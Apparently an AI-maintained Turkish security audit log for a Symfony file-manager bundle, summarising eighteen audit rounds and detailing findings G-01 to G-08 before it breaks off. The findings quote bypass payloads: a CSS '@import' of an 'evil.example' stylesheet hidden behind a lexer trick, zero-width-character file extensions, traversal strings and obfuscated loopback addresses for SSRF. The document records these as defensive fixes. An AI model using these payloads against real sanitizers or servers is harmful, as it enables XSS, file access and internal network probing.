# 14 — Güvenlik Denetimi, Mantık Taraması ve Değişiklik Raporu (Canlı Günlük)

Bu döküman, **LiveUX FileManagerBundle** üzerinde gerçekleştirilen tüm satır-satır güvenlik (hacker perspektifi) taramalarını, fonksiyonlar arası çapraz mantık denetimlerini, **global çok-dilli (Unicode / NFC-NFD / IDNA / IME / RTL)** uyumluluk kontrollerini ve yapılan kod/test değişikliklerini kalıcı olarak kayıt altına alır.

> **Not:** Bu dosya **sürekli eklenebilir (living document)** yapıda tasarlanmıştır. Yeni yapılan her denetim turu, tespit edilen açıklar/mantık hataları ve uygulanan düzeltmeler bu dosyaya yeni bir tur bölümü olarak eklenir ve durumları (`[ ] Bekliyor` → `[x] Tamamlandı`) güncellenir.
>
> **Denetçi Model & Ortam Künyesi:**
> - **AI Model & Versiyon:** Google Antigravity — Gemini 4 (Extra High Reasoning)
> - **Paket & Sürüm:** `liveux/file-manager-bundle` (`LiveUX\FileManagerBundle`) `v0.1.0`
> - **Çalışma Ortamı:** PHP `8.4.15`, Symfony `8.1.11`, PHPUnit `13.4.8`, PHPStan `Level 8`, Node.js `v24.20.0`
> - **Son Güncelleme Tarihi:** `25.11.2026`

---

## 1. Denetim Turları Genel Durum Özeti

| Tur | Tarih | Kapsam & Odak | Bulgu Sayısı | Durum | Doğrulama Metrikleri |
| :---: | :---: | :--- | :---: | :---: | :--- |
| **1–3. Tur** | Kasım 2026 | Temel RBAC, Path Traversal, SVG XSS/XXE, SSRF, ZIP Bomb/Slip, DOM XSS, Stimulus Yarış Durumları | 45+ | ✅ Tamamlandı | `AuditRegressionTest`, `ExtremeSecurityTest`, `ThirdPassAuditTest`, `dom_security_test.mjs` |
| **4. Tur** | 23.11.2026 | Çoklu Kiracı (`{user_id}`) İzolasyonu, Dosya İçi Sihirli Bayt (Magic Bytes) Doğrulaması, S3/Bulut Çöp Kutusu Fallback, Usage Guard | 22 | ✅ Tamamlandı | `FourthPassAuditTest` |
| **5. Tur** | 24.11.2026 | Çapraz Volume Taşıma Atomikliği, Klasör Alt-Öğe Voter Koruması, Çift Adımlı Rename MIME Kontrolü, DBAL/JSON Metadata Kilitleri | 19 | ✅ Tamamlandı | PHPStan L8 `0 hata`, PHPUnit `230/230`, JS `20/20` (`FifthPassAuditTest`) |
| **6. Tur** | 24.11.2026 | **Global Çok-Dilli Unicode (`\p{M}`, NFC/NFD, CJK/İndik/Arapça/Tayca)**, UTS-46 IDNA SSRF, Sıfır Genişlikli Uzantı XSS, `permissions.view` Temel Kapısı, CSS Yorum-String Diferansiyeli, Tam RTL (`dir="rtl"`) & IME | 28 | ✅ Tamamlandı | PHPStan L8 `0 hata`, PHPUnit `237/237` (`2.556` assertion, `SixthPassGlobalSecurityAuditTest`), JS `24/24` |
| **7. Tur** | 24.11.2026 | Tırnaksız CSS `url(#x?a=/*)` Lexer Bypass, CJK İdeografik Nokta (`。`/`｡`), Hangul Filler (`\p{L}`) & Variation Selector (`\p{M}`), macOS APFS NFD `substr` Parçalanması, Klasör Noktalı İsim & Rename, `ImageEditor` Sonsuz Döngü DoS, Çöp Kutusu Çift Kota Sayımı | 24 | ✅ Tamamlandı | PHP lint `148/148`, PHPStan L8 `0 hata`, PHPUnit `249/249` (`2.616` assertion, `SeventhPassGlobalSecurityAuditTest`), JS `25/25`, Twig `33/33`, YAML `3/3` |
| **8. Tur** | 24.11.2026 | **Rapor-Kod Tutarlılık Denetimi (`T-01..T-08`)** + W3C CSS `\/*` Escape/Yorum Kaçakçılığı, CJK Nokta + Sıfır Genişlikli Uzantı, `DuplicateDetector` `O(1)` Boyut-Öncelikli Hash & `DoctrineDbalMetadataStorage` Batch `preload()` (`0 N+1 SQL`), `DirectoryLister` Ağaç & Inspector Performansı | 22 (`8 + 14`) | ✅ Tamamlandı | PHP lint `149/149`, PHPStan L8 `0 hata`, PHPUnit `258/258` (`2.671` assertion, `EighthPassGlobalSecurityAuditTest`), JS `26/26`, Twig `33/33`, YAML `3/3` |
| **9. Tur** | 24.11.2026 | **Rapor/Doküman/Skill Tutarlılık Denetimi (`T9-01..T9-10`)** + Çift Uzantı & Surrogate/CSS Escape XSS, Çok-Kullanıcılı Cache Poisoning & Subvolume İzolasyonu, Atomik Toplu İşlem Ön-Doğrulaması, S3 Sanal Alt-Klasör Metadata & DBAL Kapasite/NFC, `O(N+Z)` ZIP Hash Snapshot, Global Unicode (`U+2024`/ZWSP/BiDi), RTL Marquee & IME | 25 (`10 + 15`) | ✅ Tamamlandı | PHP lint `150/150`, PHPStan L8 `0 hata`, PHPUnit `269/269` (`2.757` assertion, `NinthPassGlobalSecurityAuditTest`), JS `27/27`, Twig `33/33`, YAML `3/3` |
| **10. Tur** | 24.11.2026 | **Rapor/Doküman/Skill Tutarlılık Denetimi (`T10-01..T10-14`)** + XML/CSS/XHTML Namespace XSS, ZWNJ/ZWJ & Global Unicode, RBAC Trash/Abort/Usage Kapıları, DBAL Transaction Atomikliği & PostgreSQL Prefix İndeks, `clearstatcache` & Stream/Generator Tarama, Stimulus Yaşam Döngüsü/`dirCache` LRU/Intl Önbelleği & RTL | 27 (`14 + 13`) | ✅ Tamamlandı | PHP lint `151/151`, PHPStan L8 `0 hata`, PHPUnit `279/279` (`2.860` assertion, `TenthPassGlobalSecurityAuditTest`), JS `28/28`, Twig `33/33`, YAML `3/3` |
| **11. Tur** | 24.11.2026 | **Kasım 2026 CVE Taraması + Rapor/Doküman/Skill Doğrulama (`T11-01..T11-09`)** + SVG `<style>` CDATA/CSS Sertleştirmesi, SIIT/ORCHID/SRv6 IPv6 SSRF, Kanonik `.trash` & Kodlanmış `/%2f` Koruması, ZIP Ata-Dosya Çarpışması & Boyut Sınırı, EXIF `5`/`7`, DBAL NFC/NFD Tekilleştirme, Cache Ortak Grup Etiketi/Jenerasyonu & Global Grapheme/RTL/IME | 21 (`9 + 12`) | ✅ Tamamlandı | PHP lint `152/152`, PHPStan L8 `0 hata`, PHPUnit `293/293` (`2.998` assertion, `EleventhPassGlobalSecurityAuditTest`), JS `29/29`, Twig `33/33`, YAML `3/3` |
| **12. Tur** | 24.11.2026 | **Klasör Öğe Sayısı Görünmeme Kök Neden Çözümü + Tutarlılık Doğrulaması (`T12-01..T12-09`) + Hacker/Mantık/Performans/Global Unicode Denetimi (`P12-01..P12-14`)** | 23 (`9 + 14`) | ✅ Tamamlandı | PHP lint `154/154`, PHPStan L8 `0 hata`, PHPUnit `298/298` (`3.071` assertion, `TwelfthPassGlobalSecurityAuditTest`), JS `30/30` (`frontend_audit_test` Test 16), Twig `33/33`, YAML `3/3`, SSR `3.015 ms → 5.8 ms` |
| **13. Tur** | 24.11.2026 | **Pass-12 Tutarlılık Doğrulaması (`T13-01..T13-09`) + DI/Decorator, Katalog DoS, Pre-Read Thumbnail Auth, Uzun UTF-8/SVG MIME, DBAL PG İndeks & JS Yarış/IME/AltGr Denetimi (`P13-01..P13-16`)** | 25 (`9 + 16`) | ✅ Tamamlandı | PHP lint `153/153`, PHPStan L8 `0 hata`, PHPUnit `307/307` (`3.135` assertion, `ThirteenthPassGlobalSecurityAuditTest`), JS `31/31` (`frontend_audit_test` Test 17), Twig `33/33`, YAML `3/3`, `cache:clear` OK |
| **14. Tur** | 25.11.2026 | **Canlı DI `ParseError` Kök Neden Çözümü (`getDirectoryListerService.php`) + Pass-13 Tutarlılık Doğrulaması (`T14-01..T14-12`) + Hacker/Eşzamanlılık/Performans/CLI/A11y/Global Çok-Dilli Denetim (`P14-01..P14-20`)** | 32 (`12 + 20`) | ✅ Tamamlandı | PHP lint `154/154`, PHPStan L8 `0 hata`, PHPUnit `318/318` (`3.210` assertion, `0` uyarı, `FourteenthPassGlobalSecurityAuditTest`), JS `32/32` (`node --check 7/7`, `frontend_audit_test` Test 18), Twig `33/33`, YAML `3/3`, `cache:clear --env=dev` + derlenmiş `getDirectoryListerService.php` OK |
| **15. Tur** | 25.11.2026 | **Pass-14 Tutarlılık Doğrulaması (`T15-01..T15-10`) + Yerel Symlink Kuşatması (`ConfinedLocalFilesystemAdapter`), Sistemik Ata-Klasör Yetkilendirmesi, RFC 9110 Byte Range, SVG Katı İzin Listesi & `<use>` DoS, DBAL PostgreSQL B-Tree Aralık Taraması, Parçalı Yükleme/Görsel Editör/Erişilebilirlik & Global Çok-Dilli Denetim (`P15-01..P15-17`)** | 27 (`10 + 17`) | ✅ Tamamlandı | PHP lint `157/157`, PHPStan L8 `0 hata`, PHPUnit `328/328` (`3.330` assertion, `0` hata/başarısızlık/uyarı, `FifteenthPassGlobalSecurityAuditTest`), JS `33/33` (`node --check 7/7`, `frontend_audit_test` Test 19), Twig `33/33`, YAML `3/3`, `cache:clear --env=dev` + derlenmiş `getDirectoryListerService.php` OK |
| **16. Tur** | 25.11.2026 | **Mobil Modal/OffCanvas Adaptif Mimarisi + Rapor Tutarlılığı (`T16-01..T16-02`) + PostgreSQL `text_pattern_ops` `~>=~`/`~<=~`, SVG `<use>` Üstel DoS/`xml:id`/Çift `href`, Dekore `AccessDecisionManager`/`TraceableVoter`, `ThumbnailCleanupListener` Shard Purge, S3 Çakışan Klasör Taşıma, Per-Volume Kota Kilidi (`flock`), Trash Oracle, `AutoInject` Raw-Text/Yorum Maskesi, `ai.locale`, S3 `{user_id}` & ZIP Önbellek Tutarlılığı, Mobil CSS Özgüllük/Kapatma/`close` Yarışı/`unstyled`/Inspector Bant Genişliği & Global Çok-Dilli Denetim (`P16-01..P16-24`)** | 26 (`2 + 24`) | ✅ Tamamlandı | PHP lint `158/158`, PHPStan L8 `0 hata`, PHPUnit `340/340` (`3.399` assertion, `0` hata/başarısızlık/uyarı, `SixteenthPassGlobalSecurityAuditTest`), JS `35/35` (`node --check 7/7`, `frontend_audit_test` Test 20–21), Twig `33/33`, YAML `3/3`, `cache:clear --env=dev` + `asset-map:compile` OK |
| **17. Tur** | 25.11.2026 | **Derin DI/Parser/RBAC & Eşzamanlılık/Performans/Mobil/Global Çok-Dilli Denetim (`P17-01..P17-28`):** `DetectExternalVotersPass` Factory/Sentetik/MethodCall/Alias Zinciri, `SvgSanitizer` Çok-Öğeli `id`/`xml:id` & Kopuk `<use>` Gölgeleme, `AutoInject` `O(N)` Tarayıcı & CDN Paylaşımlı Önbellek Koruması, `TwigExtension` Kesin Rota/Çift-Kodlu Uzantı, `PickerType` Çok-Volume Çöp & Bozuk UTF-8 Koruması, `O(1)` Router URL Serileştirme, Profil Numaralandırmasız CSRF, DBAL Kök↔Alt-Klasör & Yerel Atomik UPSERT/`saveMany`, Politika Parmak İzli Önbellek İzolasyonu, Re-entrant Kota/Çöp Kilitleri & S3 Toplu Çöp Önbelleği, Çapraz-`basePath` Thumbnail Temizliği, Farsça/İndik ZWNJ Koruması, Çok-Geçişli URL BiDi/Kontrol Reddi, 9 Tema Koyu/Açık Kontrastı, WCAG Odak Tuzağı, Dokunmatik/RTL Galeri Sıralama & Görsel Düzenleyici Bellek/Canvas Koruması | 27 | ✅ Tamamlandı | PHP lint `159/159`, PHPStan L8 `0 hata`, PHPUnit `351/351` (`3.476` assertion, `0` hata/başarısızlık/uyarı, `SeventeenthPassGlobalSecurityAuditTest`), JS `36/36` (`node --check 7/7`, `frontend_audit_test` Test 22), Twig `33/33`, YAML `3/3`, `cache:clear --env=dev` + `asset-map:compile` (`1.084` varlık) OK |
| **18. Tur** | 25.11.2026 | **Çok-Kiracılı İzolasyon, CPU DoS, Eşzamanlılık/S3 Tek-Geçiş & WCAG 2.1 AA / RTL Denetimi (`P18-01..P18-25`):** `DynamicPathResolver` Ayrık `{user_id}` Uzayı (`--h-` & `'guest'`/`'user'` Çakışma Koruması), `SvgSanitizer` Global `<use>` Adım/Çift-ID Bütçesi, `?fallback=1` `CLEAR_CACHE` Kapısı, `checkUsage` Alt-Ağaç Voter/Çöp Koruması, `TwigExtension` Üçüncü-Taraf Origin Spoofing Engeli, `AutoInject` Tırnaklı Attribute/RCDATA Maskeleme, Harici Kalıcı Chunk Kilitleri & Zorunlu Volume Yazma Kilidi, `TrashManager` Kilitli `deletePermanently()` & Kısmi S3 Çöp Geri Alımı, `FileOperationsService` Kilit-İçi TOCTOU/`finally` & Tek-Geçişli S3 Klasör Taraması, `MessageTranslator` POSIX `.UTF-8` Bölgesel Katalogları, `ImageOptimizer` 255-Bayt WebP Sınırı, `unstyled` Koyu Lightbox & 9 Tema WCAG AA Kontrastı, `restoreLastVisitedLocation` İptal Yarışı, Bağlam Menüsü Odak/Klavye Koruması, Ağaç Odak & ARIA Rolleri, Mobil Avatar/Klasör/Yatay Menü & RTL BiDi/Kısayol Uyumu | 24 | ✅ Tamamlandı | PHP lint `160/160`, PHPStan L8 `0 hata`, PHPUnit `360/360` (`3.524` assertion, `0` hata/başarısızlık/uyarı, `EighteenthPassGlobalSecurityAuditTest`), JS `37/37` (`node --check 7/7`, `frontend_audit_test` Test 23), Twig `33/33`, YAML `3/3`, `cache:clear --env=dev` + `asset-map:compile` (`1.084` varlık) OK |

---

## 2. Tamamlanan Turlarda (1–6. Tur) Yapılan Ana Değişiklikler ve Eklemeler

### 2.1. Güvenlik ve Yetkilendirme (Security & RBAC)
- **Merkezi Unicode & Güvenlik Yardımcıları:**
  - `src/Util/UnicodeHelper.php`: NFC/NFKC normalizasyonu (`toNfc`, `toNfkc`), C0/C1 (`\p{Cc}`), satır/paragraf ayırıcıları (`\p{Zl}`, `\p{Zp}`), BiDi override/isolate (`U+202A..U+202E`, `U+2066..U+2069`, `U+061C`) ve tag kontrol karakteri tespiti (`hasForbiddenControls`), görünmez karakter iskeleti (`visibleSkeleton`), UTS-46 IDNA Punycode host kanonikleştirme (`canonicalizeHostToAscii`), UTF-8/UTF-16LE/BE/UTF-32 BOM duyarlı metin önizleme (`decodeTextPreview`), çok baytlı gövde kesme (`truncateStemBytes`) ve `\Collator` doğal sıralama (`compareNatural`) eklendi.
  - `src/Security/PathNormalizer.php` & `src/Security/FileSecurityGuard.php`: Görünmez karakterlerle gizlenmiş traversal (`..\u{200B}/`), tam genişlikli noktalar (`\u{FF0E}\u{FF0E}/`), sıfır genişlikli dosya uzantıları (`xss.s\u{200B}vg`, `shell.p\u{200C}hp`), NTFS Alternate Data Streams (`::$DATA`), Windows cihaz adları (`CON`, `PRN`, `AUX`, `NUL`, `COM1..9`, `LPT1..9`, `CONIN$`, `CONOUT$`), çift uzantılar (`file.php.jpg`) ve NFC/NFD `exclude_patterns` / `.trash` bypass vektörleri kapatıldı.
- **Upload & SVG XSS Koruması:**
  - `src/Service/UploadManager.php`: `FilenameNormalizer::normalizeForUpload()` çağrısı `detectMimeType()`, `validateMimeType()`, `SvgSanitizer` ve `ImageOptimizer` adımlarının **önüne** alındı; böylece normalizasyon sonrası ortaya çıkabilecek uzantı değişimlerinin (`xss.s\u{200B}vg` → `xss.svg`) denetimsiz geçmesi imkansız hale getirildi.
  - `src/Security/SvgSanitizer.php`: XXE (`<!DOCTYPE`, `<!ENTITY`), `<script>`, `<foreignObject>`, SMIL animasyon etiketleri, `on*` event attribute'ları, harici `href`/`xlink:href` ve `<style>` içi `@import` / harici `url()` vektörleri engellendi; CSS string-içi `/*...*/` yorum diferansiyeli kapatıldı.
- **RBAC `permissions.view` Temel Kapısı (Baseline Gate):**
  - `src/Security/FileManagerVoter.php` & `src/Security/FileManagerAuthorizer.php`: Profilde `view` izni tanımlıysa, `view` izni reddedilen bir kullanıcının varsayılan `true` olan diğer izinleri (`download`, `download_zip`, `share`, `rename`, `delete`, `upload`) kullanması hem Voter hem Authorizer seviyesinde engellendi.
  - `src/Controller/DownloadController.php`, `src/Controller/ZipDownloadController.php`, `src/Service/ShareLinkService.php`, `src/Service/ZipArchiveService.php`: Her zaman önce `FILE_MANAGER_VIEW` yetkisi doğrulandı; ZIP indirmelerine `Content-Type: application/zip` ve `Content-Security-Policy: default-src 'none'; sandbox` eklendi; ZIP açma (`extractArchive`) sırasında alt klasörler için `UPLOAD` + `CREATE_FOLDER` Voter kontrolleri eklendi.
  - `src/Service/FileOperationsService.php`: Klasör taşıma, yeniden adlandırma ve kalıcı silme (`delete`) işlemlerinde klasör içindeki tüm alt öğeler için Voter izin doğrulaması (`validateDirectoryContentsForMove`, `validateDirectoryContentsForDelete`) zorunlu kılındı.
- **SSRF ve Uzak URL İndirme Koruması:**
  - `src/Service/RemoteUrlImporter.php`: Özel/loopback/link-local/CGNAT/metadata/NAT64 IPv4 ve IPv6 aralıkları, tam genişlikli/IDNA loopback (`127。0。0。1`, `ｌｏｃａｌｈｏｓｔ`), sekizli/onaltılı IP (`0177.0.0.1`, `0x7f000001`), kimlik bilgili URL'ler ve standart dışı portlar engellendi; DNS Rebinding (TOCTOU) saldırılarına karşı `CURLOPT_RESOLVE` ile IP sabitleme (pinning) uygulandı; geçerli IDN (`https://bücher.de`) ve UTF-8 path (`https://cdn.example.com/產品/圖片.png`) desteği ile RFC 6266 `filename*` önceliği eklendi.

### 2.2. Global Çok-Dilli (Multilingual), Unicode, IME ve RTL Desteği
- **Dünya Yazı Sistemleri ve Birleştirici İşaretler (`\p{M}`):**
  - `src/Service/FilenameNormalizer.php`, `src/Controller/ImageEditorController.php`, `src/Service/ZipArchiveService.php`, `src/Service/RemoteUrlImporter.php`: Regex'lerde `\p{L}\p{N}` yanına `\p{M}` (Combining Marks) eklendi; Hintçe (Devanagari), Tayca, Bengalce, Tamilce, Arapça harekeler, Farsça ZWNJ, İbranice, Çince, Japonca, Korece, Vietnamca/Fransızca (macOS NFD) ve Kiril dosya adlarının bozulmadan işlenmesi sağlandı.
- **Dil Bağımsız Arama Katlama & Doğal Sıralama:**
  - `src/Service/DirectoryLister.php` & `assets/controllers/browser_controller.js`: NFC normalizasyonu + Türkçe/İngilizce noktalı-noktasız `İ`/`I`/`i`/`ı` uyumu (`İletişim` ↔ `iletişim`, `IMG` ↔ `img`, `Işık` ↔ `ışık`) + Yunanca `ς`/`σ` + tam genişlikli etiket araması (`＃東京` ↔ `#東京`) ve global etiket virgülleri (`,`, `،`, `、`, `，`) eklendi.
- **BCP-47 Locale, Profil Bazlı `locale` ve Tam RTL (`dir="rtl"`) Arayüzü:**
  - `src/Service/MessageTranslator.php`, `src/DependencyInjection/Configuration.php`, `src/Config/YamlConfigProvider.php`: Genişletilmiş BCP-47/POSIX locale doğrulaması (`zh-Hans-CN`, `sr_Latn_RS`, `es_419`, `ckb`, `fil`), bölgesel fallback zinciri (`zh_Hans_CN` → `zh_Hans` → `zh_CN` → `zh`), script duyarlı RTL tespiti (`ar`, `he`, `fa`, `ur`, `ckb`, `ug`, `pa_Arab`, `az_Arab` → RTL; `uz_Latn`, `pa_Guru` → LTR) ve profil bazlı `profiles.<name>.locale` yapılandırması eklendi.
  - `assets/styles/core.css`, `assets/controllers/browser_controller.js`, `assets/controllers/dialog_controller.js`, `assets/controllers/picker_controller.js`, `templates/**`: Fiziksel CSS özellikleri mantıksal özelliklere (`margin-inline`, `padding-inline`, `border-inline`, `inset-inline`, `text-align: start/end`) dönüştürüldü; RTL ikon aynalama (`scaleX(-1)`), RTL kenar çubuğu boyutlandırma, RTL Grid ok tuşu yönü, CJK IME kompozisyon koruması (`event.isComposing`), 1 karakterli CJK derin arama ve özel volume'lerde `return_type: 'path'` küçük resim önizlemesi (`thumbUrl`) eklendi.

### 2.3. Depolama, CLI ve Paketleme İyileştirmeleri
- **Case-Only Rename Inode Kontrolü:** `FileOperationsService::isSameLocalInodeRename()` ile Linux/S3 gibi büyük-küçük harf duyarlı dosya sistemlerinde farklı dosyaların (`REPORT.pdf` vs `report.pdf`) ezilmesi önlendi.
- **CLI `{user_id}` Koruması:** `DuplicatesCommand`, `StorageStatsCommand`, `TrashPurgeCommand`, `ThumbnailClearCommand`, `ThumbnailWarmupCommand`, `OptimizeImagesCommand`, `EnrichMetadataCommand` ve `CacheClearCommand` içinde `{user_id}` kullanan dinamik volume'lerin CLI'da sahte `guest/` klasörü oluşturması engellendi.
- **Çeviri ve Paketleme:** `en`, `tr`, `fr` YAML çeviri dosyaları (`487` anahtar) birebir eşitlendi; JS testleri `tests/Js/` altına taşındı.

---

## 3. 7. Tur (Pass-7) Denetim Bulguları ve Uygulanan Değişiklikler Listesi

Aşağıdaki **24 bulgu**, 7. tur satır-satır güvenlik, çapraz fonksiyon ve global Unicode/RTL taramasında tespit edilmiş, tamamı kodda düzeltilmiş ve `tests/Unit/Security/SeventhPassGlobalSecurityAuditTest.php` ile `tests/Js/frontend_audit_test.mjs` (Test 11) üzerinden doğrulanmıştır:

### 3.1. Kritik ve Yüksek Güvenlik Bulguları (G-01 – G-09)

- [x] **G-01 [KRİTİK] `SvgSanitizer` & `browser_controller.js` — Tırnaksız `url(#x?a=/*)` ile CSS Yorum/Lexer Senkron Kayması (`@import` ve Harici `url()` Bypass)**
  - **Dosyalar:** `src/Security/SvgSanitizer.php`, `assets/controllers/browser_controller.js`
  - **Bulgu:** W3C CSS Syntax Level 3 §4.3.6'ya göre tırnaksız `url(#x?a=/*)` içinde `/*` yorum başlatmaz (`)` karakterine kadar tek bir URL token'ıdır). Ancak `stripCssCommentsPreservingStrings()` yalnızca `"..."` ve `'...'` tırnaklı stringleri koruduğu için, `rect { filter: url(#x?a=/*); } @import "https://evil.example/xss.css"; c { filter: url(#y?b=*/); }` yapısında aradaki `@import` ve harici `url(...)` ifadeleri yorum sanılıp silinmekte ve orijinal `<style>` / `style="..."` olduğu gibi SVG içinde bırakılmaktaydı.
  - **Yapılan Değişiklik:**
    1. `SvgSanitizer::hasDangerousCss()` içinde `matchesDangerousCssTokens()` hem ham CSS ve ham escape-çözülmüş CSS üzerinde (yorumlar silinmeden önce) hem de yorumlar silindikten sonra çalıştırıldı.
    2. `matchesDangerousCssTokens()` içinde `url(...)` / `src(...)` yalnızca sıkı yerel XML/SVG ID referanslarına (`/(?:url|src)\((?!(["\']?)#[a-z0-9_.:-]+\1\))/i`) izin verecek şekilde sıkılaştırıldı; `?`, `/*`, `*/`, `:` içeren tüm `url(#...)` ifadeleri reddedildi.
    3. Aynı kural `browser_controller.js` `hasUnsafeSvgCss()` içine de birebir uygulandı.

- [x] **G-02 [YÜKSEK] CJK İdeografik Nokta (`。` `U+3002`) ve Yarım Genişlikli Nokta (`｡` `U+FF61`) ile Gizli Dosya ve Windows Cihaz Adı Bypass'ı**
  - **Dosyalar:** `src/Util/UnicodeHelper.php`, `src/Security/PathNormalizer.php`, `src/Security/FileSecurityGuard.php`
  - **Bulgu:** NFKC (`\Normalizer::FORM_KC`) tam genişlikli noktayı (`．` `U+FF0E`) ASCII `.`'ya çevirir ancak `。` (`U+3002`) ve `｡` (`U+FF61`) karakterlerini çevirmez. Bu nedenle `"aux。jpg"`, `"con｡txt"` Windows cihaz adı kontrolünü ve `"。secret"`, `"｡env"`, `"。htaccess"` gizli/engelli dosya kontrollerini aşabilmekteydi.
  - **Yapılan Değişiklik:** `UnicodeHelper::foldDotEquivalents()` eklenerek `["\u{3002}", "\u{FF0E}", "\u{FF61}", "\u{FE52}"]` karakterleri `PathNormalizer::assertSafeSegment()`, `FileSecurityGuard::assertSafeFilename()`, `FileSecurityGuard::assertSafeFolderName()` ve `FileSecurityGuard::assertAccessiblePath()` içinde `.` karakterine katlandı.

- [x] **G-03 [YÜKSEK] Çöp Kutusu (`TrashManager` / `ApiController`) Klasör Kalıcı Silme (`purgeTrash` / `emptyTrash`) Alt-Öğe Voter Bypass'ı & Kök (`''`) Yetki Çelişkisi**
  - **Dosyalar:** `src/Service/TrashManager.php`, `src/Controller/ApiController.php`
  - **Bulgu:**
    1. Bir klasör önce çöp kutusuna taşınıp ardından `purgeTrash` veya `emptyTrash` ile kalıcı silindiğinde, `TrashManager::deletePermanently()` yalnızca kök klasörün `$entry->originalPath` yolunda `TRASH_PURGE` kontrolü yapmakta, klasörün içindeki alt öğelerde `TRASH_PURGE` Voter kontrolü yapmamaktaydı.
    2. `TrashManager::purgeExpired()` `isGranted()` çağrısına çözümlenmiş `$volume->name` yerine ham `$volumeName` (`null` olabilir) geçmekteydi.
    3. `ApiController::trash()` ve `handleEmptyTrash()` öğe bazlı `$e->originalPath` filtrelemesinden hemen önce kök dizin `''` üzerinde yetki zorunlu tutarak alt-klasör kapsamlı (path-scoped) Voter kullanan kiracıları (`403`) engellemekteydi.
  - **Yapılan Değişiklik:**
    1. `TrashManager::deletePermanently()` içinde `$enforceVoter === true` ve `$entry->isFolder` iken çöp kutusundaki klasörün tüm alt öğeleri için `TRASH_PURGE` Voter kontrolü (`validateTrashedFolderContentsForPurge`) eklendi.
    2. `TrashManager::purgeExpired()` içinde çözümlenmiş `$volume->name` kullanıldı ve alt öğe yetki reddinde diğer süresi dolmuş öğelerin temizlenmeye devam etmesi sağlandı.
    3. `ApiController::trash()`, `handleRestoreTrash()`, `handlePurgeTrash()` ve `handleEmptyTrash()` içinde path-scoped Voter'ların çalışabilmesi için `hasAnyVisibleTrashPermission()` ve normalize edilmiş `$existing->originalPath` yetki doğrulaması eklendi.

- [x] **G-04 [YÜKSEK] `ApiController::handleBulkMove()` Ön-Doğrulama Döngüsünde Hedef Volume, `UPLOAD` İzni ve Trash-Atası Kontrolü Eksikliği**
  - **Dosya:** `src/Controller/ApiController.php`
  - **Bulgu:** `handleBulkMove()` ön-doğrulama döngüsü `$cleanTargetDir` için `assertAccessiblePath`, `!$isCopy` için `assertNotTrashAncestor`, kaynak öğede `VIEW`, hedef volume üzerinde `$perm` (`MOVE`/`COPY`) ve kopyalama/çapraz-volume taşımada `FileManagerPermissions::UPLOAD` kontrolü yapmamaktaydı.
  - **Yapılan Değişiklik:** `handleBulkMove()` ön-doğrulama bloğuna `$cleanTargetDir` erişilebilirlik, `$targetVolume` çözümleme, kaynak `VIEW`, hedef `$perm` + `UPLOAD` yetki kontrolleri ve `!$isCopy` için `assertNotTrashAncestor` eklendi.

- [x] **G-05 [YÜKSEK] `FileOperationsService`, `AssetEnrichmentService` ve `MetadataSyncListener` İçinde `FILE_MANAGER_VIEW` Kontrolü ve Klasör Kopyalamada Metadata Sızıntısı**
  - **Dosyalar:** `src/Service/FileOperationsService.php`, `src/Service/AssetEnrichmentService.php`, `src/EventListener/MetadataSyncListener.php`
  - **Bulgu:**
    1. Özel bir Symfony Voter bir dosya/klasör üzerinde `FILE_MANAGER_VIEW` yetkisini reddettiğinde, `FileOperationsService` (`rename`, `cloneItem`, `moveOrCopy`, `delete`, metadata güncelleme) ve `AssetEnrichmentService` kaynak yol üzerinde `VIEW` kontrolü yapmamaktaydı.
    2. `FileOperationsService::copyDirectory()` klasör kopyalama/klonlama sırasında yetkisiz alt dosyaları atlarken (`continue`), `MetadataSyncListener` (`copyPrefix`) klasör altındaki tüm metadata kayıtlarını (atlanmış gizli alt dosyaların `alt`/`title`/`caption`/`tags` verileri dahil) yeni klasöre kopyalamaktaydı.
  - **Yapılan Değişiklik:**
    1. `FileOperationsService` (`rename`, `cloneItem`, `moveOrCopy`, `delete`, `updateFolderMetadata`, `updateFolderAppearance`, `toggleFolderPin`, `updateFileMetadata`, `validateDirectoryContentsForMove`, `copyDirectory`) ve `AssetEnrichmentService::assertEnrichGranted()` içine kaynak yol üzerinde `FILE_MANAGER_VIEW` kontrolü eklendi.
    2. `MetadataSyncListener::pruneOrphanCopiedMetadata()` eklenerek klasör kopyalama/klonlama sonrasında hedef dizinde fiziksel olarak bulunmayan (Voter veya ignore kuralı nedeniyle atlanmış) alt öğelere ait metadata kayıtlarının hedeften otomatik temizlenmesi sağlandı.

- [x] **G-06 [YÜKSEK] `ImageEditorController::resolveTargetPath()` — `naming.transformer: 'folder'` veya Uzun `prepend`/`append` ile Sonsuz Döngü (CPU DoS)**
  - **Dosya:** `src/Controller/ImageEditorController.php`
  - **Bulgu:** `do { ... } while ($filesystem->fileExists($candidate))` döngüsü içinde her iterasyonda `normalizeForUpload($base . $suffix . '.' . $ext, ...)` çağrıldığı için `naming.transformer: 'folder'` veya uzun `prepend`/`append` aktif olduğunda her iterasyon aynı dosya adını üreterek sonsuz döngüye girmekteydi.
  - **Yapılan Değişiklik:** `normalizeForUpload()` döngüden **önce** bir kez çağrıldı, normalize edilmiş gövde `185` byte'a kesildi ve döngü içinde yalnızca `-edited` / `-edited-%d` soneki eklendi; döngü koşuluna `$filesystem->directoryExists($candidate)` da eklendi.

- [x] **G-07 [ORTA-YÜKSEK] `FileManagerPickerType` — Tampered POST'ta `return_type: 'path'` ve `url` İçin `FileSecurityGuard` Kontrolü ve `max_files` Locale Eksikliği**
  - **Dosya:** `src/Form/FileManagerPickerType.php`
  - **Bulgu:**
    1. `isSafePickerValue()` içinde `return_type === 'path'` ve `return_type === 'url'` iken `.trash/...`, `.env`, `shell.php`, `aux。jpg` gibi yollar `FileSecurityGuard` ile engellenmemekteydi.
    2. `max_files` hatası için `$this->resolveLocale($profileName)` çağrısında `$options['locale']` argümanı unutulmuştu.
  - **Yapılan Değişiklik:** `isSafePickerValue()` içine hem `path` hem `url` (ve `path=` query parametresi) için `.trash`, gizli dot-segmentler ve `FileSecurityGuard::assertSafeFilename()` / `BLOCKED_EXTENSIONS` / `BLOCKED_FILENAMES` kontrolleri eklendi; `max_files` dinleyicisinde `$validationLocale` kullanıldı.

- [x] **G-08 [ORTA-YÜKSEK] `FileManagerAuthorizer` vs `FileManagerVoter` — Eksik İzin Anahtarında `extract_zip` Fail-Open Tutarsızlığı**
  - **Dosyalar:** `src/Security/FileManagerAuthorizer.php`, `src/Config/YamlConfigProvider.php`
  - **Bulgu:** `voter_enabled: false` (veya `authChecker: null`) iken `$profile->permissions` dizisinde bulunmayan bir anahtar için `FileManagerAuthorizer` `extract_zip` dahil `true` dönmekteydi.
